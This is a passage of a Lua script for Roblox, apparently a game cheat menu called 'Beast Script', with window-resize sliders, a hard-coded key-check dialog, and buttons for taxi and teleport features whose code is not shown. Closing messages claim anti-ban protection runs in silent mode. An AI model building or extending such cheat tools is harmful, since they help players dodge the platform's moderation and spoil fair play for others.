    wValue.Text = tostring(WindowSettings.width)
    wValue.TextColor3 = Color3.fromRGB(255, 200, 220)
    wValue.TextXAlignment = Enum.TextXAlignment.Right
    wValue.BackgroundTransparency = 1
    wValue.Font = Enum.Font.GothamBold
    wValue.TextSize = 14
    wValue.Parent = parent
    
    local wSlider = Instance.new("Frame")
    wSlider.Size = UDim2.new(0, 200, 0, 4)
    wSlider.Position = UDim2.new(0, 100, 0, y + 10)
    wSlider.BackgroundColor3 = Color3.fromRGB(60, 30, 50)
    wSlider.BorderSizePixel = 0
    wSlider.Parent = parent
    
    local wFill = Instance.new("Frame")
    wFill.Size = UDim2.new((WindowSettings.width - WindowSettings.minWidth) / (WindowSettings.maxWidth - WindowSettings.minWidth), 0, 1, 0)
    wFill.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    wFill.BorderSizePixel = 0
    wFill.Parent = wSlider
    
    local wHandle = Instance.new("TextButton")
    wHandle.Size = UDim2.new(0, 14, 0, 14)
    wHandle.Position = UDim2.new((WindowSettings.width - WindowSettings.minWidth) / (WindowSettings.maxWidth - WindowSettings.minWidth), -7, 0.5, -7)
    wHandle.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    wHandle.BorderSizePixel = 0
    wHandle.Text = ""
    wHandle.Parent = wSlider
    y = y + 40
    
    -- 高度
    local hLabel = Instance.new("TextLabel")
    hLabel.Size = UDim2.new(0, 80, 0, 25)
    hLabel.Position = UDim2.new(0, 10, 0, y)
    hLabel.Text = "📏 高度"
    hLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
    hLabel.TextXAlignment = Enum.TextXAlignment.Left
    hLabel.BackgroundTransparency = 1
    hLabel.Font = Enum.Font.GothamBold
    hLabel.TextSize = 14
    hLabel.Parent = parent
    
    local hValue = Instance.new("TextLabel")
    hValue.Size = UDim2.new(0, 50, 0, 25)
    hValue.Position = UDim2.new(1, -60, 0, y)
    hValue.Text = tostring(WindowSettings.height)
    hValue.TextColor3 = Color3.fromRGB(255, 200, 220)
    hValue.TextXAlignment = Enum.TextXAlignment.Right
    hValue.BackgroundTransparency = 1
    hValue.Font = Enum.Font.GothamBold
    hValue.TextSize = 14
    hValue.Parent = parent
    
    local hSlider = Instance.new("Frame")
    hSlider.Size = UDim2.new(0, 200, 0, 4)
    hSlider.Position = UDim2.new(0, 100, 0, y + 10)
    hSlider.BackgroundColor3 = Color3.fromRGB(60, 30, 50)
    hSlider.BorderSizePixel = 0
    hSlider.Parent = parent
    
    local hFill = Instance.new("Frame")
    hFill.Size = UDim2.new((WindowSettings.height - WindowSettings.minHeight) / (WindowSettings.maxHeight - WindowSettings.minHeight), 0, 1, 0)
    hFill.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    hFill.BorderSizePixel = 0
    hFill.Parent = hSlider
    
    local hHandle = Instance.new("TextButton")
    hHandle.Size = UDim2.new(0, 14, 0, 14)
    hHandle.Position = UDim2.new((WindowSettings.height - WindowSettings.minHeight) / (WindowSettings.maxHeight - WindowSettings.minHeight), -7, 0.5, -7)
    hHandle.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    hHandle.BorderSizePixel = 0
    hHandle.Text = ""
    hHandle.Parent = hSlider
    y = y + 40
    
    -- 预设
    local pLabel = Instance.new("TextLabel")
    pLabel.Size = UDim2.new(0, 380, 0, 22)
    pLabel.Position = UDim2.new(0, 10, 0, y)
    pLabel.Text = "⚡ 预设大小"
    pLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
    pLabel.TextXAlignment = Enum.TextXAlignment.Left
    pLabel.BackgroundTransparency = 1
    pLabel.Font = Enum.Font.GothamBold
    pLabel.TextSize = 14
    pLabel.Parent = parent
    y = y + 28
    
    local presets = {{380,380,"小"},{480,470,"中"},{600,550,"大"},{750,650,"超大"}}
    for i, p in ipairs(presets) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 80, 0, 30)
        btn.Position = UDim2.new(0, 10 + (i-1) * 90, 0, y)
        btn.Text = p[3]
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 13
        btn.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn.BorderSizePixel = 0
        btn.Parent = parent
        btn.MouseButton1Click:Connect(function()
            WindowSettings.width = p[1]
            WindowSettings.height = p[2]
            mainFrame.Size = UDim2.new(0, p[1], 0, p[2])
            mainFrame.Position = UDim2.new(0.5, -p[1]/2, 0.5, -p[2]/2)
            wValue.Text = tostring(p[1])
            hValue.Text = tostring(p[2])
            local wp = (p[1] - WindowSettings.minWidth) / (WindowSettings.maxWidth - WindowSettings.minWidth)
            local hp = (p[2] - WindowSettings.minHeight) / (WindowSettings.maxHeight - WindowSettings.minHeight)
            wFill.Size = UDim2.new(wp, 0, 1, 0)
            wHandle.Position = UDim2.new(wp, -7, 0.5, -7)
            hFill.Size = UDim2.new(hp, 0, 1, 0)
            hHandle.Position = UDim2.new(hp, -7, 0.5, -7)
        end)
    end
    y = y + 40
    
    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(0, 120, 0, 32)
    resetBtn.Position = UDim2.new(0, 135, 0, y)
    resetBtn.Text = "🔄 重置默认"
    resetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    resetBtn.TextSize = 13
    resetBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 150)
    resetBtn.BorderSizePixel = 0
    resetBtn.Parent = parent
    y = y + 40
    
    resetBtn.MouseButton1Click:Connect(function()
        WindowSettings.width = 480
        WindowSettings.height = 470
        mainFrame.Size = UDim2.new(0, 480, 0, 470)
        mainFrame.Position = UDim2.new(0.5, -240, 0.5, -235)
        wValue.Text = "480"
        hValue.Text = "470"
        local wp = (480 - WindowSettings.minWidth) / (WindowSettings.maxWidth - WindowSettings.minWidth)
        local hp = (470 - WindowSettings.minHeight) / (WindowSettings.maxHeight - WindowSettings.minHeight)
        wFill.Size = UDim2.new(wp, 0, 1, 0)
        wHandle.Position = UDim2.new(wp, -7, 0.5, -7)
        hFill.Size = UDim2.new(hp, 0, 1, 0)
        hHandle.Position = UDim2.new(hp, -7, 0.5, -7)
    end)
    
    local wDrag = false
    local hDrag = false
    wHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then wDrag = true end
    end)
    wHandle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then wDrag = false end
    end)
    hHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then hDrag = true end
    end)
    hHandle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then hDrag = false end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            if wDrag then
                local pos = wSlider.AbsolutePosition
                local size = wSlider.AbsoluteSize
                local percent = math.clamp((input.Position.X - pos.X) / size.X, 0, 1)
                local newW = WindowSettings.minWidth + (WindowSettings.maxWidth - WindowSettings.minWidth) * percent
                newW = math.round(newW / 10) * 10
                WindowSettings.width = newW
                mainFrame.Size = UDim2.new(0, newW, 0, WindowSettings.height)
                mainFrame.Position = UDim2.new(0.5, -newW/2, 0.5, -WindowSettings.height/2)
                wValue.Text = tostring(newW)
                wFill.Size = UDim2.new(percent, 0, 1, 0)
                wHandle.Position = UDim2.new(percent, -7, 0.5, -7)
            end
            if hDrag then
                local pos = hSlider.AbsolutePosition
                local size = hSlider.AbsoluteSize
                local percent = math.clamp((input.Position.X - pos.X) / size.X, 0, 1)
                local newH = WindowSettings.minHeight + (WindowSettings.maxHeight - WindowSettings.minHeight) * percent
                newH = math.round(newH / 10) * 10
                WindowSettings.height = newH
                mainFrame.Size = UDim2.new(0, WindowSettings.width, 0, newH)
                mainFrame.Position = UDim2.new(0.5, -WindowSettings.width/2, 0.5, -newH/2)
                hValue.Text = tostring(newH)
                hFill.Size = UDim2.new(percent, 0, 1, 0)
                hHandle.Position = UDim2.new(percent, -7, 0.5, -7)
            end
        end
    end)
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 拖拽滑块调整窗口大小"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
end

-- ============================================================
-- 功能区面板（出租车 + 标点传送）
-- ============================================================
local function createFunctionPanel(parent)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 30)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "⚡ 功能区"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = parent
    y = y + 35
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    -- ===== 出租车按钮 =====
    local taxiBtn = Instance.new("TextButton")
    taxiBtn.Size = UDim2.new(0, 380, 0, 50)
    taxiBtn.Position = UDim2.new(0, 10, 0, y)
    taxiBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    taxiBtn.BackgroundTransparency = 0.2
    taxiBtn.Text = "🚗 打开出租车"
    taxiBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    taxiBtn.TextSize = 16
    taxiBtn.Font = Enum.Font.GothamBold
    taxiBtn.BorderSizePixel = 1
    taxiBtn.BorderColor3 = Color3.fromRGB(0, 255, 100)
    taxiBtn.Parent = parent
    
    local taxiCorner = Instance.new("UICorner")
    taxiCorner.CornerRadius = UDim.new(0, 8)
    taxiCorner.Parent = taxiBtn
    
    taxiBtn.MouseButton1Click:Connect(function()
        CreateTaxiWindow()
    end)
    
    y = y + 58
    
    -- ===== 标点传送按钮 =====
    local markerBtn = Instance.new("TextButton")
    markerBtn.Size = UDim2.new(0, 380, 0, 50)
    markerBtn.Position = UDim2.new(0, 10, 0, y)
    markerBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    markerBtn.BackgroundTransparency = 0.2
    markerBtn.Text = "📍 打开标点传送"
    markerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    markerBtn.TextSize = 16
    markerBtn.Font = Enum.Font.GothamBold
    markerBtn.BorderSizePixel = 1
    markerBtn.BorderColor3 = Color3.fromRGB(100, 200, 255)
    markerBtn.Parent = parent
    
    local markerCorner = Instance.new("UICorner")
    markerCorner.CornerRadius = UDim.new(0, 8)
    markerCorner.Parent = markerBtn
    
    markerBtn.MouseButton1Click:Connect(function()
        CreateMarkerWindow()
    end)
    
    y = y + 58
    
    -- 提示
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 点击按钮打开独立悬浮窗"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
end

-- ============================================================
-- 卡密验证UI
-- ============================================================
local function createVerifyUI(callback)
    verifyCallback = callback
    if verifyScreenGui then
        verifyScreenGui:Destroy()
        verifyScreenGui = nil
    end
    
    verifyScreenGui = Instance.new("ScreenGui")
    verifyScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    verifyScreenGui.Name = "VerifyUI"
    verifyScreenGui.ResetOnSpawn = false
    
    local bgMask = Instance.new("Frame")
    bgMask.Size = UDim2.new(1, 0, 1, 0)
    bgMask.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgMask.BackgroundTransparency = 0.5
    bgMask.Parent = verifyScreenGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 380, 0, 280)
    frame.Position = UDim2.new(0.5, -190, 0.5, -140)
    frame.BackgroundColor3 = Color3.fromRGB(30, 10, 25)
    frame.BackgroundTransparency = 0.05
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 50, 150)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = verifyScreenGui
    
    local verifyBg = Instance.new("ImageLabel")
    verifyBg.Size = UDim2.new(1, 0, 1, 0)
    verifyBg.Position = UDim2.new(0, 0, 0, 0)
    verifyBg.BackgroundTransparency = 1
    verifyBg.ScaleType = Enum.ScaleType.Fit
    verifyBg.Parent = frame
    loadImage(verifyBg)
    
    local bigImage = Instance.new("ImageLabel")
    bigImage.Size = UDim2.new(0, 100, 0, 100)
    bigImage.Position = UDim2.new(0.5, -50, 0, 10)
    bigImage.BackgroundTransparency = 1
    bigImage.ScaleType = Enum.ScaleType.Fit
    bigImage.Parent = frame
    loadImage(bigImage)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, 120)
    title.Text = "🔑 卡密验证"
    title.TextColor3 = Color3.fromRGB(255, 200, 50)
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.Parent = frame
    
    local hint = Instance.new("TextLabel")
    hint.Size = UDim2.new(1, 0, 0, 25)
    hint.Position = UDim2.new(0, 0, 0, 155)
    hint.Text = "请输入卡密（卡密：9178）"
    hint.TextColor3 = Color3.fromRGB(200, 200, 220)
    hint.TextXAlignment = Enum.TextXAlignment.Center
    hint.BackgroundTransparency = 1
    hint.Font = Enum.Font.Gotham
    hint.TextSize = 14
    hint.Parent = frame
    
    local input = Instance.new("TextBox")
    input.Size = UDim2.new(0, 250, 0, 40)
    input.Position = UDim2.new(0.5, -125, 0, 185)
    input.PlaceholderText = "请输入卡密..."
    input.Text = ""
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.TextSize = 16
    input.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    input.BackgroundTransparency = 0.3
    input.BorderSizePixel = 1
    input.BorderColor3 = Color3.fromRGB(255, 50, 150)
    input.Font = Enum.Font.Gotham
    input.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 25)
    status.Position = UDim2.new(0, 0, 0, 230)
    status.Text = ""
    status.TextColor3 = Color3.fromRGB(255, 200, 50)
    status.TextXAlignment = Enum.TextXAlignment.Center
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Gotham
    status.TextSize = 13
    status.Parent = frame
    
    local confirm = Instance.new("TextButton")
    confirm.Size = UDim2.new(0, 120, 0, 35)
    confirm.Position = UDim2.new(0.5, -60, 0, 245)
    confirm.Text = "✅ 验证"
    confirm.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirm.TextSize = 15
    confirm.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    confirm.BorderSizePixel = 0
    confirm.Parent = frame
    
    confirm.MouseButton1Click:Connect(function()
        local key = input.Text
        if key == VALID_KEY then
            isVerified = true
            verifyTime = tick()
            status.Text = "✅ 验证成功！"
            status.TextColor3 = Color3.fromRGB(0, 255, 0)
            task.wait(0.5)
            if verifyScreenGui then
                verifyScreenGui:Destroy()
                verifyScreenGui = nil
            end
            if callback then callback() end
        else
            status.Text = "❌ 卡密错误，请输入 9178"
            status.TextColor3 = Color3.fromRGB(255, 0, 0)
            input.Text = ""
        end
    end)
    
    input.FocusLost:Connect(function(enter)
        if enter then confirm.MouseButton1Click:Fire() end
    end)
end

-- ============================================================
-- 加载主UI
-- ============================================================
local function loadMainUI()
    if mainScreenGui then
        mainScreenGui:Destroy()
        mainScreenGui = nil
        mainUI = nil
    end
    
    mainScreenGui = Instance.new("ScreenGui")
    mainScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    mainScreenGui.Name = "BeastUI"
    mainScreenGui.ResetOnSpawn = false
    
    mainUI = Instance.new("Frame")
    mainUI.Size = UDim2.new(0, WindowSettings.width, 0, WindowSettings.height)
    mainUI.Position = UDim2.new(0.5, -WindowSettings.width/2, 0.5, -WindowSettings.height/2)
    mainUI.BackgroundColor3 = Color3.fromRGB(30, 10, 25)
    mainUI.BackgroundTransparency = 0.05
    mainUI.BorderSizePixel = 2
    mainUI.BorderColor3 = Color3.fromRGB(255, 50, 150)
    mainUI.Active = true
    mainUI.Draggable = true
    mainUI.Parent = mainScreenGui
    
    local mainBg = Instance.new("ImageLabel")
    mainBg.Size = UDim2.new(1, 0, 1, 0)
    mainBg.Position = UDim2.new(0, 0, 0, 0)
    mainBg.BackgroundTransparency = 1
    mainBg.ScaleType = Enum.ScaleType.Fit
    mainBg.Parent = mainUI
    loadImage(mainBg)
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 28)
    titleBar.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    titleBar.BackgroundTransparency = 0.1
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainUI
    
    local titleIcon = Instance.new("ImageLabel")
    titleIcon.Size = UDim2.new(0, 24, 0, 24)
    titleIcon.Position = UDim2.new(0, 8, 0, 2)
    titleIcon.BackgroundTransparency = 1
    titleIcon.ScaleType = Enum.ScaleType.Fit
    titleIcon.Parent = titleBar
    loadImage(titleIcon)
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -50, 1, 0)
    titleText.Position = UDim2.new(0, 38, 0, 0)
    titleText.Text = "🐾 野兽脚本"
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.BackgroundTransparency = 1
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 14
    titleText.Parent = titleBar
    
    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0, 28, 0, 28)
    minBtn.Position = UDim2.new(1, -56, 0, 0)
    minBtn.Text = "─"
    minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    minBtn.TextSize = 18
    minBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 120)
    minBtn.BorderSizePixel = 0
    minBtn.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 28, 0, 28)
    closeBtn.Position = UDim2.new(1, -28, 0, 0)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 14
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = titleBar
    
    -- 左侧导航
    local leftPanel = Instance.new("Frame")
    leftPanel.Size = UDim2.new(0, 100, 1, -28)
    leftPanel.Position = UDim2.new(0, 0, 0, 28)
    leftPanel.BackgroundColor3 = Color3.fromRGB(20, 8, 18)
    leftPanel.BackgroundTransparency = 0.2
    leftPanel.BorderSizePixel = 1
    leftPanel.BorderColor3 = Color3.fromRGB(255, 50, 150)
    leftPanel.Parent = mainUI
    
    -- 右侧内容
    local rightPanel = Instance.new("Frame")
    rightPanel.Size = UDim2.new(1, -108, 1, -28)
    rightPanel.Position = UDim2.new(0, 108, 0, 28)
    rightPanel.BackgroundColor3 = Color3.fromRGB(25, 10, 22)
    rightPanel.BackgroundTransparency = 0.2
    rightPanel.BorderSizePixel = 0
    rightPanel.Parent = mainUI
    
    rightContent = Instance.new("ScrollingFrame")
    rightContent.Size = UDim2.new(1, -8, 1, -8)
    rightContent.Position = UDim2.new(0, 4, 0, 4)
    rightContent.BackgroundTransparency = 1
    rightContent.BorderSizePixel = 0
    rightContent.CanvasSize = UDim2.new(0, 0, 0, 0)
    rightContent.ScrollBarThickness = 4
    rightContent.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 150)
    rightContent.Parent = rightPanel
    
    local function updateCanvas()
        local total = 0
        for _, child in ipairs(rightContent:GetChildren()) do
            if child:IsA("Frame") or child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
                local pos = child.Position.Y.Offset
                local size = child.Size.Y.Offset
                if pos + size > total then total = pos + size end
            end
        end
        rightContent.CanvasSize = UDim2.new(0, 0, 0, total + 20)
    end
    
    -- 导航按钮
    local currentTab = "主页"
    
    local btn0 = Instance.new("TextButton")
    btn0.Size = UDim2.new(1, -10, 0, 22)
    btn0.Position = UDim2.new(0, 5, 0, 5)
    btn0.Text = "🏠 主页"
    btn0.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn0.TextSize = 11
    btn0.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    btn0.BorderSizePixel = 0
    btn0.Parent = leftPanel
    
    local btn1 = Instance.new("TextButton")
    btn1.Size = UDim2.new(1, -10, 0, 22)
    btn1.Position = UDim2.new(0, 5, 0, 30)
    btn1.Text = "🐾 公告"
    btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
    btn1.TextSize = 11
    btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
    btn1.BorderSizePixel = 0
    btn1.Parent = leftPanel
    
    local btn2 = Instance.new("TextButton")
    btn2.Size = UDim2.new(1, -10, 0, 22)
    btn2.Position = UDim2.new(0, 5, 0, 55)
    btn2.Text = "🐾 服务器"
    btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
    btn2.TextSize = 11
    btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
    btn2.BorderSizePixel = 0
    btn2.Parent = leftPanel
    
    local btn3 = Instance.new("TextButton")
    btn3.Size = UDim2.new(1, -10, 0, 22)
    btn3.Position = UDim2.new(0, 5, 0, 80)
    btn3.Text = "⚡ 功能区"
    btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
    btn3.TextSize = 11
    btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
    btn3.BorderSizePixel = 0
    btn3.Parent = leftPanel
    
    local btn4 = Instance.new("TextButton")
    btn4.Size = UDim2.new(1, -10, 0, 22)
    btn4.Position = UDim2.new(0, 5, 0, 105)
    btn4.Text = "📐 调整"
    btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
    btn4.TextSize = 11
    btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
    btn4.BorderSizePixel = 0
    btn4.Parent = leftPanel
    
    local btn5 = Instance.new("TextButton")
    btn5.Size = UDim2.new(1, -10, 0, 22)
    btn5.Position = UDim2.new(0, 5, 0, 130)
    btn5.Text = "🤖 AI"
    btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
    btn5.TextSize = 11
    btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
    btn5.BorderSizePixel = 0
    btn5.Parent = leftPanel
    
    btn0.MouseButton1Click:Connect(function()
        currentTab = "主页"
        btn0.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn0.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
        createHomePanel(rightContent)
        updateCanvas()
    end)
    
    btn1.MouseButton1Click:Connect(function()
        currentTab = "公告"
        btn1.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn0.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn0.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
        createAnnouncementContent(rightContent)
        updateCanvas()
    end)
    
    btn2.MouseButton1Click:Connect(function()
        currentTab = "服务器"
        btn2.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn0.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn0.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
        createServerContent(rightContent)
        updateCanvas()
    end)
    
    btn3.MouseButton1Click:Connect(function()
        currentTab = "功能区"
        btn3.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn0.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn0.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
        createFunctionPanel(rightContent)
        updateCanvas()
    end)
    
    btn4.MouseButton1Click:Connect(function()
        currentTab = "调整"
        btn4.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn0.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn0.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn5.TextColor3 = Color3.fromRGB(255, 200, 220)
        createUIAdjustPanel(rightContent, mainUI)
        updateCanvas()
    end)
    
    btn5.MouseButton1Click:Connect(function()
        currentTab = "AI"
        btn5.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
        btn0.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn1.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn2.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn3.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn4.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        btn5.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn0.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn1.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn2.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn3.TextColor3 = Color3.fromRGB(255, 200, 220)
        btn4.TextColor3 = Color3.fromRGB(255, 200, 220)
        createAIPanel(rightContent)
        updateCanvas()
    end)
    
    createHomePanel(rightContent)
    task.wait(0.1)
    updateCanvas()
    
    -- 最小化
    local minimized = false
    minBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            mainUI.Size = UDim2.new(0, 180, 0, 28)
            mainUI.Position = UDim2.new(1, -190, 0, 10)
            leftPanel.Visible = false
            rightPanel.Visible = false
            minBtn.Text = "□"
        else
            mainUI.Size = UDim2.new(0, WindowSettings.width, 0, WindowSettings.height)
            mainUI.Position = UDim2.new(0.5, -WindowSettings.width/2, 0.5, -WindowSettings.height/2)
            leftPanel.Visible = true
            rightPanel.Visible = true
            minBtn.Text = "─"
        end
    end)
    
    closeBtn.MouseButton1Click:Connect(function()
        if taxiRunning then
            StopTaxiLoop()
        end
        if mainScreenGui then
            mainScreenGui:Destroy()
            mainScreenGui = nil
            mainUI = nil
        end
    end)
end

-- ============================================================
-- 初始化
-- ============================================================
createVerifyUI(function()
    loadMainUI()
    print("🐾 野兽脚本已加载！")
    print("🔑 卡密: 9178（永久有效）")
    print("📍 功能区包含：出租车 + 标点传送")
    print("🛡️ 防封已启用（静默模式）")
end)